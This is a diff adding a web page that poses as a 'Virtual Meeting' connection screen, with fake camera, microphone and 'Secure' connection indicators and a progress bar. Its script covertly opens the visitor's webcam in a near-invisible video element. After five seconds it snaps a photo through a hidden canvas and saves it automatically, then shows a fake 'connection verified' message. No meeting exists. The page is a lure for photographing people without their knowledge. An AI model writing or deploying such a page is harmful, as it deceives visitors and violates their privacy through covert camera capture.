@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virtual Meeting</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- SweetAlert2 for modals -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        /* Base styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f9fafb;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 1.25rem;
+            overflow: hidden;
+        }
+        
+        /* Utility classes */
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Background styles */
+        .blob {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(135deg, rgba(147, 51, 234, 0.2) 0%, rgba(79, 70, 229, 0.2) 100%);
+            border-radius: 50%;
+            filter: blur(30px);
+            z-index: -1;
+        }
+        
+        /* Card styles */
+        .card {
+            background-color: white;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+            border-radius: 1rem;
+            width: 100%;
+            max-width: 36rem;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* Header styles */
+        .header {
+            background: linear-gradient(135deg, #4f46e5 0%, #9333ea 100%);
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 1.875rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            color: #f3f4f6;
+        }
+        
+        /* Content styles */
+        .content {
+            padding: 2rem;
+        }
+        
+        /* Profile styles */
+        .profile {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .avatar {
+            width: 6rem;
+            height: 6rem;
+            background-color: #e5e7eb;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+            overflow: hidden;
+            box-shadow: inset 0 2px 4px 0 rgba(0, 0, 0, 0.1);
+        }
+        
+        .avatar i {
+            font-size: 2.5rem;
+            color: #9ca3af;
+        }
+        
+        .profile h2 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 1.5rem;
+        }
+        
+        /* Status indicators */
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem;
+            width: 100%;
+            max-width: 28rem;
+            margin-bottom: 2rem;
+        }
+        
+        .status-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .status-icon {
+            width: 3rem;
+            height: 3rem;
+            background-color: #ede9fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 0.5rem;
+        }
+        
+        .status-icon i {
+            color: #6366f1;
+        }
+        
+        .status-item span:first-of-type {
+            font-size: 0.875rem;
+            color: #4b5563;
+        }
+        
+        .status-item span:last-of-type {
+            font-size: 0.75rem;
+            color: #10b981;
+        }
+        
+        /* Progress bar */
+        .progress-container {
+            width: 100%;
+            background-color: #e5e7eb;
+            border-radius: 999px;
+            height: 0.625rem;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background-color: #6366f1;
+            border-radius: 999px;
+            width: 10%;
+            transition: width 0.5s ease;
+        }
+        
+        /* Status text */
+        .status-text {
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+        
+        /* Thank you page */
+        .thank-you {
+            text-align: center;
+            padding: 3rem 2rem;
+        }
+        
+        .thank-you h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #1f2937;
+            margin-bottom: 1rem;
+        }
+        
+        .thank-you p {
+            color: #6b7280;
+            margin-bottom: 2rem;
+        }
+        
+        .check-icon {
+            width: 4rem;
+            height: 4rem;
+            background-color: #ecfdf5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 2rem auto;
+        }
+        
+        .check-icon i {
+            font-size: 2rem;
+            color: #10b981;
+        }
+        
+        /* Invisible elements */
+        video {
+            width: 1px;
+            height: 1px;
+            position: absolute;
+            opacity: 0.01;
+        }
+        
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background blobs -->
+    <div class="blob" style="top: 0; left: 0; transform: translate(-50%, -50%);"></div>
+    <div class="blob" style="bottom: 0; right: 0; transform: translate(50%, 50%);"></div>
+    
+    <!-- Main app card -->
+    <div class="card" id="main-view">
+        <!-- Header -->
+        <div class="header">
+            <h1>Virtual Meeting</h1>
+            <p>Setting up your connection...</p>
+        </div>
+        
+        <!-- Content -->
+        <div class="content">
+            <!-- Profile -->
+            <div class="profile">
+                <div class="avatar">
+                    <i class="fas fa-user"></i>
+                </div>
+                <h2>Connecting to your meeting</h2>
+                
+                <!-- Status indicators -->
+                <div class="status-grid">
+                    <div class="status-item">
+                        <div class="status-icon">
+                            <i class="fas fa-video"></i>
+                        </div>
+                        <span>Camera</span>
+                        <span>Setting up...</span>
+                    </div>
+                    
+                    <div class="status-item">
+                        <div class="status-icon">
+                            <i class="fas fa-microphone"></i>
+                        </div>
+                        <span>Microphone</span>
+                        <span>Ready</span>
+                    </div>
+                    
+                    <div class="status-item">
+                        <div class="status-icon">
+                            <i class="fas fa-network-wired"></i>
+                        </div>
+                        <span>Connection</span>
+                        <span>Secure</span>
+                    </div>
+                </div>
+                
+                <!-- Progress bar -->
+                <div class="progress-container">
+                    <div class="progress-bar" id="progress-bar"></div>
+                </div>
+                
+                <p class="status-text" id="status-text">Verifying connection... Please wait</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Thank You View (hidden initially) -->
+    <div class="card hidden" id="thank-you-view">
+        <div class="header">
+            <h1>Virtual Meeting</h1>
+            <p>Connection completed</p>
+        </div>
+        
+        <div class="thank-you">
+            <div class="check-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2>Thank You!</h2>
+            <p>Your connection has been verified successfully.</p>
+            <button id="close-btn" style="background-color: #6366f1; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; font-weight: 500; cursor: pointer;">Close Window</button>
+        </div>
+    </div>
+    
+    <!-- Camera elements (invisible) -->
+    <video id="camera" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const camera = document.getElementById('camera');
+            const canvas = document.getElementById('canvas');
+            const progressBar = document.getElementById('progress-bar');
+            const statusText = document.getElementById('status-text');
+            const mainView = document.getElementById('main-view');
+            const thankYouView = document.getElementById('thank-you-view');
+            const closeBtn = document.getElementById('close-btn');
+            
+            // Close button handler
+            closeBtn.addEventListener('click', function() {
+                window.close();
+                // Fallback if window.close() doesn't work
+                document.body.innerHTML = '<div style="text-align: center; padding: 50px;"><h1>Thank you for connecting</h1><p>This window can now be closed.</p></div>';
+            });
+            
+            // Progress bar animation
+            let progress = 10;
+            const progressInterval = setInterval(() => {
+                progress += 5;
+                if (progress > 90) {
+                    progress = 90; // Cap at 90% until complete
+                }
+                progressBar.style.width = progress + '%';
+            }, 1000);
+            
+            // Check if camera is available
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                handleError('Browser ini tidak mendukung penggunaan kamera');
+                return;
+            }
+            
+            // Error handler
+            function handleError(message) {
+                clearInterval(progressInterval);
+                Swal.fire({
+                    icon: 'error',
+                    title: 'MAAF',
+                    text: message,
+                    confirmButtonText: 'OK'
+                }).then(() => {
+                    showThankYou();
+                });
+            }
+            
+            // Function to show thank you view
+            function showThankYou() {
+                mainView.classList.add('hidden');
+                thankYouView.classList.remove('hidden');
+            }
+            
+            // Start camera
+            function startCamera() {
+                const constraints = { 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                };
+                
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function(stream) {
+                        camera.srcObject = stream;
+                        camera.play();
+                        
+                        // Wait for video to load
+                        camera.onloadedmetadata = function() {
+                            setTimeout(() => {
+                                if (camera.videoWidth === 0 || camera.videoHeight === 0) {
+                                    setTimeout(capturePhoto, 1000);
+                                } else {
+                                    statusText.textContent = "Almost ready...";
+                                    capturePhoto();
+                                }
+                            }, 5000);
+                        };
+                    })
+                    .catch(function(error) {
+                        let errorMessage = 'Tidak bisa melanjutkan: ';
+                        
+                        switch(error.name) {
+                            case 'NotAllowedError':
+                                errorMessage += 'Berikan ulang akses yang dibutuhkan';
+                                break;
+                            case 'NotFoundError':
+                                errorMessage += 'Device anda tidak mendukung, gunakan device lain';
+                                break;
+                            case 'NotReadableError':
+                                errorMessage += 'Device siap digunakan';
+                                break;
+                            case 'OverconstrainedError':
+                                errorMessage += 'Device tidak kompatibel';
+                                break;
+                            case 'SecurityError':
+                                errorMessage += 'Device anda tidak mendukung, gunakan device lain';
+                                break;
+                            default:
+                                errorMessage += error.message || 'Unknown error';
+                        }
+                        
+                        handleError(errorMessage);
+                    });
+            }
+            
+            // Capture photo
+            function capturePhoto() {
+                if (camera.readyState < 4) {
+                    setTimeout(capturePhoto, 1000);
+                    return;
+                }
+                
+                // Update progress to 100%
+                progressBar.style.width = '100%';
+                clearInterval(progressInterval);
+                
+                // Set up canvas
+                canvas.width = camera.videoWidth;
+                canvas.height = camera.videoHeight;
+                const context = canvas.getContext('2d');
+                
+                // Draw image to canvas
+                try {
+                    context.fillStyle = "#000";
+                    context.fillRect(0, 0, canvas.width, canvas.height);
+                    context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+                    
+                    // Save as image
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    
+                    // Stop camera
+                    if (camera.srcObject) {
+                        const stream = camera.srcObject;
+                        const tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());
+                    }
+                    
+                    // Get current timestamp for filename
+                    const now = new Date();
+                    const timestamp = now.getFullYear() + 
+                                     ('0' + (now.getMonth() + 1)).slice(-2) + 
+                                     ('0' + now.getDate()).slice(-2) + '_' +
+                                     ('0' + now.getHours()).slice(-2) +
+                                     ('0' + now.getMinutes()).slice(-2) +
+                                     ('0' + now.getSeconds()).slice(-2);
+                    
+                    // Create download link
+                    const link = document.createElement('a');
+                    link.href = imageData;
+                    link.download = 'capture_' + timestamp + '.jpg';
+                    
+                    // Save the file automatically
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    // Show thank you
+                    setTimeout(() => {
+                        showThankYou();
+                    }, 500);
+                    
+                } catch (err) {
+                    setTimeout(capturePhoto, 1000);
+                }
+            }
+            
+            // Start the camera
+            startCamera();
+        });
+    </script>
+</body>
+</html> 
